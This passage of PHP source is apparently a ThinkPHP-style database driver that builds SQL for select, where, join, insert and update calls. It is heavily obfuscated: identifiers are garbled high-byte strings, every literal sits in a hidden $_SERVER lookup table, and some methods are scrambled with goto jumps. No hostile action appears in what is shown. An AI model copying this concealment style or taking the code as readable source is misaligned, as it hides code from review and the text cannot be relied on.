isset($C•Îƒ±’“°[$Bïõ»»™öÀ[17]][$B¾æÉçå‰–]) ? $C•Îƒ±’“°[$Bïõ»»™öÀ[17]][$B¾æÉçå‰–] : $C•Îƒ±’“°[$Bïõ»»™öÀ[17]][0], $Bïõ»»™öÀ[824] => isset($C•Îƒ±’“°[$Bïõ»»™öÀ[824]][$B¾æÉçå‰–]) ? $C•Îƒ±’“°[$Bïõ»»™öÀ[824]][$B¾æÉçå‰–] : $C•Îƒ±’“°[$Bïõ»»™öÀ[824]][0], $Bïõ»»™öÀ[13] => isset($C•Îƒ±’“°[$Bïõ»»™öÀ[13]][$B¾æÉçå‰–]) ? $C•Îƒ±’“°[$Bïõ»»™öÀ[13]][$B¾æÉçå‰–] : $C•Îƒ±’“°[$Bïõ»»™öÀ[13]][0]); return $this->connect($DÇó‘— É†, $B¾æÉçå‰–); } public function parseDSN($cğ¼Š‹°ğÑ) { $bìœŠÇØ²½ =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($cğ¼Š‹°ğÑ)) { return !1; } $D‰¨Í°òŠË = parse_url($cğ¼Š‹°ğÑ); if ($D‰¨Í°òŠË[$bìœŠÇØ²½[164]]) { $Aç…¬¯Ôì¥ = array($bìœŠÇØ²½[872] => $D‰¨Í°òŠË[$bìœŠÇØ²½[164]], $bìœŠÇØ²½[797] => isset($D‰¨Í°òŠË[$bìœŠÇØ²½[531]]) ? $D‰¨Í°òŠË[$bìœŠÇØ²½[531]] : $bìœŠÇØ²½[33], $bìœŠÇØ²½[798] => isset($D‰¨Í°òŠË[$bìœŠÇØ²½[893]]) ? $D‰¨Í°òŠË[$bìœŠÇØ²½[893]] : $bìœŠÇØ²½[33], $bìœŠÇØ²½[795] => isset($D‰¨Í°òŠË[$bìœŠÇØ²½[165]]) ? $D‰¨Í°òŠË[$bìœŠÇØ²½[165]] : $bìœŠÇØ²½[33], $bìœŠÇØ²½[796] => isset($D‰¨Í°òŠË[$bìœŠÇØ²½[166]]) ? $D‰¨Í°òŠË[$bìœŠÇØ²½[166]] : $bìœŠÇØ²½[33], $bìœŠÇØ²½[17] => isset($D‰¨Í°òŠË[$bìœŠÇØ²½[75]]) ? substr($D‰¨Í°òŠË[$bìœŠÇØ²½[75]], 1) : $bìœŠÇØ²½[33]); } else { preg_match($bìœŠÇØ²½[894], trim($cğ¼Š‹°ğÑ), $Bäİ™ë¾); $Aç…¬¯Ôì¥ = array($bìœŠÇØ²½[872] => $Bäİ™ë¾[1], $bìœŠÇØ²½[797] => $Bäİ™ë¾[2], $bìœŠÇØ²½[798] => $Bäİ™ë¾[3], $bìœŠÇØ²½[795] => $Bäİ™ë¾[4], $bìœŠÇØ²½[796] => $Bäİ™ë¾[5], $bìœŠÇØ²½[17] => $Bäİ™ë¾[6]); } $Aç…¬¯Ôì¥[$bìœŠÇØ²½[824]] = $bìœŠÇØ²½[33]; return $Aç…¬¯Ôì¥; } protected function debug() { $fğºÙµÀƒÌ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $fğºÙµÀƒÌ[895]; if (think_config($fğºÙµÀƒÌ[896])) { think_status($fğºÙµÀƒÌ[897]); think_trace($this->queryStr . $fğºÙµÀƒÌ[898] . think_status($fğºÙµÀƒÌ[20], $fğºÙµÀƒÌ[897], 6) . $fğºÙµÀƒÌ[899], $fğºÙµÀƒÌ[33], $fğºÙµÀƒÌ[900]); } } protected function parseLock($Aù†©ÌÀ = false) { $fÙó‹§¡ÂŞ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$Aù†©ÌÀ) { return $fÙó‹§¡ÂŞ[33]; } if ($fÙó‹§¡ÂŞ[826] == $this->dbType) { return $fÙó‹§¡ÂŞ[901]; } return $fÙó‹§¡ÂŞ[902]; } protected function parseSet($e›ßÔİŸ) { $Fî‰•›¾±° =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($e›ßÔİŸ as $Fë°ôŠ˜µ² => $c œçßøŸ) { if (is_array($c œçßøŸ) && $Fî‰•›¾±°[281] == $c œçßøŸ[0]) { $AÁãâ»¥„×[] = $this->parseKey($Fë°ôŠ˜µ²) . $Fî‰•›¾±°[903] . $c œçßøŸ[1]; } elseif (is_scalar($c œçßøŸ) || is_null($c œçßøŸ)) { $AÁãâ»¥„×[] = $this->parseKey($Fë°ôŠ˜µ²) . $Fî‰•›¾±°[903] . $this->parseValue($c œçßøŸ); } } return $Fî‰•›¾±°[904] . implode($Fî‰•›¾±°[47], $AÁãâ»¥„×); } protected function bindParam($a×áô›ñ™, $dØğ«ÀæÄ) { $this->bind[$_SERVER[Ö¹ñÒÁ²÷][4] . $a×áô›ñ™] = $dØğ«ÀæÄ; } protected function parseBind($dÑá“šíÍ) { $dÑá“šíÍ = array_merge($this->bind, $dÑá“šíÍ); $this->bind = array(); return $dÑá“šíÍ; } function parseKey(&$a÷öˆƒ­â÷, $F¼£­™ßÏ = true) { if ($F¼£­™ßÏ) { $a÷öˆƒ­â÷ = $this->parseKeyCheck($a÷öˆƒ­â÷); } return $a÷öˆƒ­â÷; } function parseKeyCheck($bŠ‰ËŠÅˆ¿) { $D„·‘£Ôö¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $bŠ‰ËŠÅˆ¿ = trim($bŠ‰ËŠÅˆ¿); if (!preg_match($D„·‘£Ôö¼[905], $bŠ‰ËŠÅˆ¿)) { think_exception($D„·‘£Ôö¼[906] . $bŠ‰ËŠÅˆ¿); } return $bŠ‰ËŠÅˆ¿; } protected function parseValue($BÔöëæŒÜ…) { $FÂ±˜«… =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_string($BÔöëæŒÜ…)) { $BÔöëæŒÜ… = $FÂ±˜«…[865] . $this->escapeString($BÔöëæŒÜ…) . $FÂ±˜«…[865]; } elseif (isset($BÔöëæŒÜ…[0]) && is_string($BÔöëæŒÜ…[0]) && strtolower($BÔöëæŒÜ…[0]) == $FÂ±˜«…[281]) { $BÔöëæŒÜ… = $this->escapeString($BÔöëæŒÜ…[1]); } elseif (is_array($BÔöëæŒÜ…)) { $BÔöëæŒÜ… = array_map(array($this, $FÂ±˜«…[866]), $BÔöëæŒÜ…); } elseif (is_bool($BÔöëæŒÜ…)) { $BÔöëæŒÜ… = $BÔöëæŒÜ… ? $FÂ±˜«…[83] : $FÂ±˜«…[464]; } elseif (is_null($BÔöëæŒÜ…)) { $BÔöëæŒÜ… = $FÂ±˜«…[99]; } return $BÔöëæŒÜ…; } protected function parseField($EÕßíª‹Šï) { $e¦Öƒ—†„ =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_string($EÕßíª‹Šï) && strpos($EÕßíª‹Šï, $e¦Öƒ—†„[47])) { $EÕßíª‹Šï = explode($e¦Öƒ—†„[47], $EÕßíª‹Šï); } if (is_array($EÕßíª‹Šï)) { $bĞ°¾·¶  = array(); foreach ($EÕßíª‹Šï as $A‘¢º¹²§ => $FèˆĞ Á¯) { if (!is_numeric($A‘¢º¹²§)) { $bĞ°¾·¶ [] = $this->parseKey($A‘¢º¹²§) . $e¦Öƒ—†„[907] . $this->parseKey($FèˆĞ Á¯); } else { $bĞ°¾·¶ [] = $this->parseKey($FèˆĞ Á¯); } } $Fó¸íÚ¼ = implode($e¦Öƒ—†„[47], $bĞ°¾·¶ ); } elseif (is_string($EÕßíª‹Šï) && !empty($EÕßíª‹Šï)) { $Fó¸íÚ¼ = $EÕßíª‹Šï; } else { $Fó¸íÚ¼ = $e¦Öƒ—†„[172]; } return $Fó¸íÚ¼; } protected function parseTable($Cµöìá¿‡×) { $a¨ùÎß® =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_array($Cµöìá¿‡×)) { $F®ğ­İòÉí = array(); foreach ($Cµöìá¿‡× as $EîÈšù–ì° => $C»¹“È†Õ†) { if (!is_numeric($EîÈšù–ì°)) { $F®ğ­İòÉí[] = $this->parseKey($EîÈšù–ì°) . $a¨ùÎß®[50] . $this->parseKey($C»¹“È†Õ†); } else { $F®ğ­İòÉí[] = $this->parseKey($EîÈšù–ì°); } } $Cµöìá¿‡× = $F®ğ­İòÉí; } elseif (is_string($Cµöìá¿‡×)) { if (strstr($Cµöìá¿‡×, $a¨ùÎß®[50])) { return $Cµöìá¿‡×; } $Cµöìá¿‡× = explode($a¨ùÎß®[47], $Cµöìá¿‡×); array_walk($Cµöìá¿‡×, array($this, $a¨ùÎß®[814])); } return $a¨ùÎß®[908] . trim(implode($a¨ùÎß®[909], $Cµöìá¿‡×), $a¨ùÎß®[820]) . $a¨ùÎß®[908]; } protected function parseWhere($bÕŠã…²ªï) { $bÂÁ¯´Ó™´ =& $_SERVER[Ö¹ñÒÁ²÷]; $D¨´ÌÈÄÂ« = $bÂÁ¯´Ó™´[33]; if (is_string($bÕŠã…²ªï)) { $D¨´ÌÈÄÂ« = $bÕŠã…²ªï; } else { $fŒÍÖø®Û¨ = isset($bÕŠã…²ªï[$bÂÁ¯´Ó™´[910]]) ? strtoupper($bÕŠã…²ªï[$bÂÁ¯´Ó™´[910]]) : $bÂÁ¯´Ó™´[33]; if (in_array($fŒÍÖø®Û¨, array($bÂÁ¯´Ó™´[911], $bÂÁ¯´Ó™´[912], $bÂÁ¯´Ó™´[913]))) { $fŒÍÖø®Û¨ = $bÂÁ¯´Ó™´[50] . $fŒÍÖø®Û¨ . $bÂÁ¯´Ó™´[50]; unset($bÕŠã…²ªï[$bÂÁ¯´Ó™´[910]]); } else { $fŒÍÖø®Û¨ = $bÂÁ¯´Ó™´[914]; } foreach ($bÕŠã…²ªï as $dÖÀÎ©ƒ…ø => $B…âšŒª) { $D¨´ÌÈÄÂ« .= $bÂÁ¯´Ó™´[261]; if (is_numeric($dÖÀÎ©ƒ…ø)) { $dÖÀÎ©ƒ…ø = $bÂÁ¯´Ó™´[915]; } if (0 === strpos($dÖÀÎ©ƒ…ø, $bÂÁ¯´Ó™´[70])) { $D¨´ÌÈÄÂ« .= $this->parseThinkWhere($dÖÀÎ©ƒ…ø, $B…âšŒª); } else { if (!preg_match($bÂÁ¯´Ó™´[916], trim($dÖÀÎ©ƒ…ø))) { think_exception(think_lang($bÂÁ¯´Ó™´[917]) . $bÂÁ¯´Ó™´[4] . $dÖÀÎ©ƒ…ø); } $cÅ£¡â‚ÏŞ = is_array($B…âšŒª) && isset($B…âšŒª[$bÂÁ¯´Ó™´[918]]); $dÖÀÎ©ƒ…ø = trim($dÖÀÎ©ƒ…ø); if (strpos($dÖÀÎ©ƒ…ø, $bÂÁ¯´Ó™´[267])) { $FÌ¾¡”æ = explode($bÂÁ¯´Ó™´[267], $dÖÀÎ©ƒ…ø); $DÔÄ‘ÇÖ…’ = array(); foreach ($FÌ¾¡”æ as $CØÁøåÒÈ => $aœá¤„Ê¬ï) { $cò—ä–îö = $cÅ£¡â‚ÏŞ ? $B…âšŒª[$CØÁøåÒÈ] : $B…âšŒª; $DÔÄ‘ÇÖ…’[] = $bÂÁ¯´Ó™´[244] . $this->parseWhereItem($this->parseKey($aœá¤„Ê¬ï), $cò—ä–îö) . $bÂÁ¯´Ó™´[813]; } $D¨´ÌÈÄÂ« .= implode($bÂÁ¯´Ó™´[919], $DÔÄ‘ÇÖ…’); } elseif (strpos($dÖÀÎ©ƒ…ø, $bÂÁ¯´Ó™´[268])) { $FÌ¾¡”æ = explode($bÂÁ¯´Ó™´[268], $dÖÀÎ©ƒ…ø); $DÔÄ‘ÇÖ…’ = array(); foreach ($FÌ¾¡”æ as $CØÁøåÒÈ => $aœá¤„Ê¬ï) { $cò—ä–îö = $cÅ£¡â‚ÏŞ ? $B…âšŒª[$CØÁøåÒÈ] : $B…âšŒª; $DÔÄ‘ÇÖ…’[] = $bÂÁ¯´Ó™´[244] . $this->parseWhereItem($this->parseKey($aœá¤„Ê¬ï), $cò—ä–îö) . $bÂÁ¯´Ó™´[813]; } $D¨´ÌÈÄÂ« .= implode($bÂÁ¯´Ó™´[914], $DÔÄ‘ÇÖ…’); } else { $D¨´ÌÈÄÂ« .= $this->parseWhereItem($this->parseKey($dÖÀÎ©ƒ…ø), $B…âšŒª); } } $D¨´ÌÈÄÂ« .= $bÂÁ¯´Ó™´[262] . $fŒÍÖø®Û¨; } $D¨´ÌÈÄÂ« = substr($D¨´ÌÈÄÂ«, 0, -strlen($fŒÍÖø®Û¨)); } return empty($D¨´ÌÈÄÂ«) ? $bÂÁ¯´Ó™´[33] : $bÂÁ¯´Ó™´[920] . $D¨´ÌÈÄÂ«; } protected function parseWhereItem($c„áÄŒìê, $bß ŞÔÂƒé) { $c·¶³ÚÔÓ° =& $_SERVER[Ö¹ñÒÁ²÷]; $E‰¡¼Ú‡ Ì = $c·¶³ÚÔÓ°[33]; if (is_array($bß ŞÔÂƒé)) { if (is_string($bß ŞÔÂƒé[0])) { $DŞ÷¥Ç¨ = strtolower($bß ŞÔÂƒé[0]); if (in_array($bß ŞÔÂƒé[0], array($c·¶³ÚÔÓ°[903], $c·¶³ÚÔÓ°[921], $c·¶³ÚÔÓ°[922], $c·¶³ÚÔÓ°[923], $c·¶³ÚÔÓ°[924], $c·¶³ÚÔÓ°[925]))) { $E‰¡¼Ú‡ Ì .= $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $bß ŞÔÂƒé[0] . $c·¶³ÚÔÓ°[50] . $this->parseValue($bß ŞÔÂƒé[1]); } elseif (preg_match($c·¶³ÚÔÓ°[926], $bß ŞÔÂƒé[0])) { $E‰¡¼Ú‡ Ì .= $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $this->exp[$DŞ÷¥Ç¨] . $c·¶³ÚÔÓ°[50] . $this->parseValue($bß ŞÔÂƒé[1]); } elseif (preg_match($c·¶³ÚÔÓ°[927], $bß ŞÔÂƒé[0])) { if (is_array($bß ŞÔÂƒé[1])) { $D¦¸“†Èîí = isset($bß ŞÔÂƒé[2]) ? strtoupper($bß ŞÔÂƒé[2]) : $c·¶³ÚÔÓ°[912]; if (in_array($D¦¸“†Èîí, array($c·¶³ÚÔÓ°[911], $c·¶³ÚÔÓ°[912], $c·¶³ÚÔÓ°[913]))) { $aŒ‹Îñ®«‚ = array(); foreach ($bß ŞÔÂƒé[1] as $D’ƒÔ™Ä·) { $aŒ‹Îñ®«‚[] = $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $this->exp[$DŞ÷¥Ç¨] . $c·¶³ÚÔÓ°[50] . $this->parseValue($D’ƒÔ™Ä·); } $E‰¡¼Ú‡ Ì .= $c·¶³ÚÔÓ°[244] . implode($c·¶³ÚÔÓ°[50] . $D¦¸“†Èîí . $c·¶³ÚÔÓ°[50], $aŒ‹Îñ®«‚) . $c·¶³ÚÔÓ°[813]; } } else { $E‰¡¼Ú‡ Ì .= $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $this->exp[$DŞ÷¥Ç¨] . $c·¶³ÚÔÓ°[50] . $this->parseValue($bß ŞÔÂƒé[1]); } } elseif ($c·¶³ÚÔÓ°[281] == $DŞ÷¥Ç¨) { $E‰¡¼Ú‡ Ì .= $c·¶³ÚÔÓ°[811] . $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $bß ŞÔÂƒé[1] . $c·¶³ÚÔÓ°[928]; } elseif (preg_match($c·¶³ÚÔÓ°[929], $bß ŞÔÂƒé[0])) { if (isset($bß ŞÔÂƒé[2]) && $c·¶³ÚÔÓ°[281] == $bß ŞÔÂƒé[2]) { $E‰¡¼Ú‡ Ì .= $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $this->exp[$DŞ÷¥Ç¨] . $c·¶³ÚÔÓ°[50] . $bß ŞÔÂƒé[1]; } else { if (is_string($bß ŞÔÂƒé[1])) { $bß ŞÔÂƒé[1] = explode($c·¶³ÚÔÓ°[47], $bß ŞÔÂƒé[1]); } $A¾³Œ¾¥‘œ = implode($c·¶³ÚÔÓ°[47], $this->parseValue($bß ŞÔÂƒé[1])); $E‰¡¼Ú‡ Ì .= $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $this->exp[$DŞ÷¥Ç¨] . $c·¶³ÚÔÓ°[811] . $A¾³Œ¾¥‘œ . $c·¶³ÚÔÓ°[813]; } } elseif (preg_match($c·¶³ÚÔÓ°[930], $bß ŞÔÂƒé[0])) { $BŞ˜×ø¯ãö = is_string($bß ŞÔÂƒé[1]) ? explode($c·¶³ÚÔÓ°[47], $bß ŞÔÂƒé[1]) : $bß ŞÔÂƒé[1]; $E‰¡¼Ú‡ Ì .= $c·¶³ÚÔÓ°[811] . $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $this->exp[$DŞ÷¥Ç¨] . $c·¶³ÚÔÓ°[50] . $this->parseValue($BŞ˜×ø¯ãö[0]) . $c·¶³ÚÔÓ°[914] . $this->parseValue($BŞ˜×ø¯ãö[1]) . $c·¶³ÚÔÓ°[262]; } else { think_exception(think_lang($c·¶³ÚÔÓ°[917]) . $c·¶³ÚÔÓ°[4] . $bß ŞÔÂƒé[0]); } } else { $D¯ÙÒóİã = count($bß ŞÔÂƒé); $FèÅŒ¤ÓË = isset($bß ŞÔÂƒé[$D¯ÙÒóİã - 1]) ? strtoupper($bß ŞÔÂƒé[$D¯ÙÒóİã - 1]) : $c·¶³ÚÔÓ°[33]; if (in_array($FèÅŒ¤ÓË, array($c·¶³ÚÔÓ°[911], $c·¶³ÚÔÓ°[912], $c·¶³ÚÔÓ°[913]))) { $D¯ÙÒóİã = $D¯ÙÒóİã - 1; } else { $FèÅŒ¤ÓË = $c·¶³ÚÔÓ°[911]; } for ($CÊèç›ïë = 0; $CÊèç›ïë < $D¯ÙÒóİã; $CÊèç›ïë++) { $BŞ˜×ø¯ãö = is_array($bß ŞÔÂƒé[$CÊèç›ïë]) ? $bß ŞÔÂƒé[$CÊèç›ïë][1] : $bß ŞÔÂƒé[$CÊèç›ïë]; if ($c·¶³ÚÔÓ°[281] == strtolower($bß ŞÔÂƒé[$CÊèç›ïë][0])) { $E‰¡¼Ú‡ Ì .= $c·¶³ÚÔÓ°[244] . $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $BŞ˜×ø¯ãö . $c·¶³ÚÔÓ°[928] . $FèÅŒ¤ÓË . $c·¶³ÚÔÓ°[50]; } else { $d¯Ú±µ½éÉ = is_array($bß ŞÔÂƒé[$CÊèç›ïë]) ? $this->exp[strtolower($bß ŞÔÂƒé[$CÊèç›ïë][0])] : $c·¶³ÚÔÓ°[903]; if (!$d¯Ú±µ½éÉ && is_array($bß ŞÔÂƒé[$CÊèç›ïë]) && in_array($bß ŞÔÂƒé[$CÊèç›ïë][0], array($c·¶³ÚÔÓ°[903], $c·¶³ÚÔÓ°[921], $c·¶³ÚÔÓ°[922], $c·¶³ÚÔÓ°[923], $c·¶³ÚÔÓ°[924], $c·¶³ÚÔÓ°[925]))) { $d¯Ú±µ½éÉ = $bß ŞÔÂƒé[$CÊèç›ïë][0]; } $E‰¡¼Ú‡ Ì .= $c·¶³ÚÔÓ°[244] . $c„áÄŒìê . $c·¶³ÚÔÓ°[50] . $d¯Ú±µ½éÉ . $c·¶³ÚÔÓ°[50] . $this->parseValue($BŞ˜×ø¯ãö) . $c·¶³ÚÔÓ°[928] . $FèÅŒ¤ÓË . $c·¶³ÚÔÓ°[50]; } } $E‰¡¼Ú‡ Ì = substr($E‰¡¼Ú‡ Ì, 0, -4); } } else { $E‰¡¼Ú‡ Ì .= $c„áÄŒìê . $c·¶³ÚÔÓ°[931] . $this->parseValue($bß ŞÔÂƒé); } return $E‰¡¼Ú‡ Ì; } protected function parseThinkWhere($B¶„¥±á‚…, $cº…ïì£­¥) { $AÈ“¬®À =& $_SERVER[Ö¹ñÒÁ²÷]; $C©Ö™‚Ä = $AÈ“¬®À[33]; switch ($B¶„¥±á‚…) { case $AÈ“¬®À[335]: $C©Ö™‚Ä = $cº…ïì£­¥; break; case $AÈ“¬®À[915]: $C©Ö™‚Ä = is_string($cº…ïì£­¥) ? $cº…ïì£­¥ : substr($this->parseWhere($cº…ïì£­¥), 6); break; case $AÈ“¬®À[932]: parse_str($cº…ïì£­¥, $Eòˆª×±ã); if (isset($Eòˆª×±ã[$AÈ“¬®À[910]])) { $AÇ•ìÍ‚Æ = $AÈ“¬®À[50] . strtoupper($Eòˆª×±ã[$AÈ“¬®À[910]]) . $AÈ“¬®À[50]; unset($Eòˆª×±ã[$AÈ“¬®À[910]]); } else { $AÇ•ìÍ‚Æ = $AÈ“¬®À[914]; } $Dó¶ï·•» = array(); foreach ($Eòˆª×±ã as $BæŠ¤¹¥—ì => $dŞÓâ™‡ÒÂ) { $Dó¶ï·•»[] = $this->parseKey($BæŠ¤¹¥—ì) . $AÈ“¬®À[931] . $this->parseValue($dŞÓâ™‡ÒÂ); } $C©Ö™‚Ä = implode($AÇ•ìÍ‚Æ, $Dó¶ï·•»); break; } return $C©Ö™‚Ä; } protected function parseLimit($fîÂßóè°š) { $aƒ°šõâà° =& $_SERVER[Ö¹ñÒÁ²÷]; return !empty($fîÂßóè°š) ? $aƒ°šõâà°[48] . $fîÂßóè°š . $aƒ°šõâà°[50] : $aƒ°šõâà°[33]; } protected function parseJoin($d¶¼ô¿ƒØ) { $eíŠç×ÄÈ =& $_SERVER[Ö¹ñÒÁ²÷]; $fõê™±„ç¼ = $eíŠç×ÄÈ[33]; if (!empty($d¶¼ô¿ƒØ)) { if (is_array($d¶¼ô¿ƒØ)) { foreach ($d¶¼ô¿ƒØ as $D¨®èÔ–¬’ => $bçÖŠÎĞ¶æ) { if (!1 !== stripos($bçÖŠÎĞ¶æ, $eíŠç×ÄÈ[933])) { $fõê™±„ç¼ .= $eíŠç×ÄÈ[50] . $bçÖŠÎĞ¶æ; } else { $fõê™±„ç¼ .= $eíŠç×ÄÈ[934] . $bçÖŠÎĞ¶æ; } } } else { $fõê™±„ç¼ .= $eíŠç×ÄÈ[934] . $d¶¼ô¿ƒØ; } } $fõê™±„ç¼ = preg_replace($eíŠç×ÄÈ[935], think_config($eíŠç×ÄÈ[838]) . $eíŠç×ÄÈ[936], $fõê™±„ç¼); return $fõê™±„ç¼; } protected function parseOrder($c°İ¬ÌøÃ–) { $aÒŒö‡óª =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_array($c°İ¬ÌøÃ–)) { $cÎ–» = array(); foreach ($c°İ¬ÌøÃ– as $dî¹×ºğ´ => $FÖ“´í¾) { if (is_numeric($dî¹×ºğ´)) { $cÎ–»[] = $this->parseKey($FÖ“´í¾); } else { $FÖ“´í¾ = in_array(strtoupper(trim($FÖ“´í¾)), array($aÒŒö‡óª[937], $aÒŒö‡óª[938])) ? $aÒŒö‡óª[50] . $FÖ“´í¾ : $aÒŒö‡óª[33]; if (preg_match($aÒŒö‡óª[939], $dî¹×ºğ´)) { $cÎ–»[] = $this->parseKey($dî¹×ºğ´) . $FÖ“´í¾; } else { think_exception($aÒŒö‡óª[940] . $dî¹×ºğ´); } } } $c°İ¬ÌøÃ– = implode($aÒŒö‡óª[47], $cÎ–»); } return !empty($c°İ¬ÌøÃ–) ? $aÒŒö‡óª[941] . $c°İ¬ÌøÃ– : $aÒŒö‡óª[33]; } protected function parseGroup($A Š˜˜ÒÍ) { $eÂœ…³©¿ =& $_SERVER[Ö¹ñÒÁ²÷]; return !empty($A Š˜˜ÒÍ) ? $eÂœ…³©¿[942] . $A Š˜˜ÒÍ : $eÂœ…³©¿[33]; } protected function parseHaving($BÉ¿éãš) { $cãªéöÆµš =& $_SERVER[Ö¹ñÒÁ²÷]; return !empty($BÉ¿éãš) ? $cãªéöÆµš[943] . $BÉ¿éãš : $cãªéöÆµš[33]; } protected function parseComment($e’º—£ÈáÁ) { $B’Œ¤ÃÎ¾Û =& $_SERVER[Ö¹ñÒÁ²÷]; return !empty($e’º—£ÈáÁ) ? $B’Œ¤ÃÎ¾Û[944] . $e’º—£ÈáÁ . $B’Œ¤ÃÎ¾Û[945] : $B’Œ¤ÃÎ¾Û[33]; } protected function parseDistinct($d÷»Õ†›Íî) { $f“Øæ™‹éà =& $_SERVER[Ö¹ñÒÁ²÷]; return !empty($d÷»Õ†›Íî) ? $f“Øæ™‹éà[946] : $f“Øæ™‹éà[33]; } protected function parseUnion($AåÊº‘Ä½) { $d¢•ƒàÈåß =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($AåÊº‘Ä½)) { return $d¢•ƒàÈåß[33]; } if (isset($AåÊº‘Ä½[$d¢•ƒàÈåß[332]])) { $Fª»Àß•éí = $d¢•ƒàÈåß[947]; unset($AåÊº‘Ä½[$d¢•ƒàÈåß[332]]); } else { $Fª»Àß•éí = $d¢•ƒàÈåß[948]; } foreach ($AåÊº‘Ä½ as $Aáªã·–Ÿ) { $B³àóøóë•[] = $Fª»Àß•éí . (is_array($Aáªã·–Ÿ) ? $this->buildSelectSql($Aáªã·–Ÿ) : $Aáªã·–Ÿ); } return implode($d¢•ƒàÈåß[50], $B³àóøóë•); } public function insert($b¶Ôõ¬¨—”, $a¤¶¨òŸ¦à = array(), $FëŞ¼Ä±âÍ = false) { goto f¼‘ùÂŒÅï; f¼‘ùÂŒÅï: $A’éÍ¥ÑÎç =& $_SERVER[Ö¹ñÒÁ²÷]; $E•ÛºŒŞ§ = $Cò›„£ªåĞ = array(); $this->model = $a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[265]]; goto cÏÏ†™æ; cÏÏ†™æ: foreach ($b¶Ôõ¬¨—” as $c’´«ÄÈƒ¹ => $Fó­õªêí©) { if (is_array($Fó­õªêí©) && $A’éÍ¥ÑÎç[281] == $Fó­õªêí©[0]) { $Cò›„£ªåĞ[] = $this->parseKey($c’´«ÄÈƒ¹); $E•ÛºŒŞ§[] = $Fó­õªêí©[1]; } elseif (is_scalar($Fó­õªêí©) || is_null($Fó­õªêí©)) { $Cò›„£ªåĞ[] = $this->parseKey($c’´«ÄÈƒ¹); $E•ÛºŒŞ§[] = $this->parseValue($Fó­õªêí©); } } $b±‚…‚õ¥ = ($FëŞ¼Ä±âÍ ? $A’éÍ¥ÑÎç[815] : $A’éÍ¥ÑÎç[816]) . $A’éÍ¥ÑÎç[817] . $this->parseTable($a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[263]]) . $A’éÍ¥ÑÎç[811] . implode($A’éÍ¥ÑÎç[47], $Cò›„£ªåĞ) . $A’éÍ¥ÑÎç[812] . implode($A’éÍ¥ÑÎç[47], $E•ÛºŒŞ§) . $A’éÍ¥ÑÎç[813]; $b±‚…‚õ¥ .= $this->parseLock(isset($a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[767]]) ? $a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[767]] : !1); goto f¢³İ¹÷Ô; f¢³İ¹÷Ô: $b±‚…‚õ¥ .= $this->parseComment(!empty($a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[337]]) ? $a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[337]] : $A’éÍ¥ÑÎç[33]); return $this->execute($b±‚…‚õ¥, $this->parseBind(!empty($a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[269]]) ? $a¤¶¨òŸ¦à[$A’éÍ¥ÑÎç[269]] : array())); goto aÊØƒŞÇ“Â; aÊØƒŞÇ“Â: } public function selectInsert($b„ñİ×ˆÖ, $e‰ŒŒµËæà, $c·ÚÏÀØìñ = array()) { goto aÂ¤‘›Ãê¨; F‰•İ†ª‹: return $this->execute($c£¡¹‹ÅÀ, $this->parseBind(!empty($c·ÚÏÀØìñ[$c¹ÍÆ½÷½Á[269]]) ? $c·ÚÏÀØìñ[$c¹ÍÆ½÷½Á[269]] : array())); goto cöÜä¡ĞÏƒ; D¢³“”¦ : array_walk($b„ñİ×ˆÖ, array($this, $c¹ÍÆ½÷½Á[814])); $c£¡¹‹ÅÀ = $c¹ÍÆ½÷½Á[949] . $this->parseTable($e‰ŒŒµËæà) . $c¹ÍÆ½÷½Á[811] . implode($c¹ÍÆ½÷½Á[47], $b„ñİ×ˆÖ) . $c¹ÍÆ½÷½Á[928]; $c£¡¹‹ÅÀ .= $this->buildSelectSql($c·ÚÏÀØìñ); goto F‰•İ†ª‹; aÂ¤‘›Ãê¨: $c¹ÍÆ½÷½Á =& $_SERVER[Ö¹ñÒÁ²÷]; $this->model = $c·ÚÏÀØìñ[$c¹ÍÆ½÷½Á[265]]; if (is_string($b„ñİ×ˆÖ)) { $b„ñİ×ˆÖ = explode($c¹ÍÆ½÷½Á[47], $b„ñİ×ˆÖ); } goto D¢³“”¦ ; cöÜä¡ĞÏƒ: } public function update($f«ÍŒãöœ, $cŠÔàáÜå¯) { $Cø»’ö’ĞŠ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->model = $cŠÔàáÜå¯[$Cø»’ö’ĞŠ[265]]; $D…øÖÈ£˜¡ = $Cø»’ö’ĞŠ[950] . $this->parseTable($cŠÔàáÜå¯[$Cø»’ö’ĞŠ[263]]) . $this->parseSet($f«ÍŒãöœ) . $this->parseWhere(!empty($cŠÔàáÜå¯[$Cø»’ö’ĞŠ[259]]) ? $cŠÔàáÜå¯[$Cø»’ö’ĞŠ[259]] : $Cø»’ö’ĞŠ[33]) . $this->parseOrder(!empty($cŠÔàáÜå¯[$Cø»’ö’ĞŠ[346]]) ? $cŠÔàáÜå¯[$Cø»’ö’ĞŠ[346]] : $Cø»’ö’ĞŠ[33]) . $this->parseLimit(!empty($cŠÔàáÜå¯[$Cø»’ö’ĞŠ[276]]) ? $cŠÔàáÜå¯[$Cø»’ö’ĞŠ[276]] : $Cø»’ö’ĞŠ[33]) . $this->parseLock(isset($cŠÔàáÜå¯[$Cø»’ö’ĞŠ[767]]) ? $cŠÔàáÜå¯[$Cø»’ö’ĞŠ[767]] : !1) . 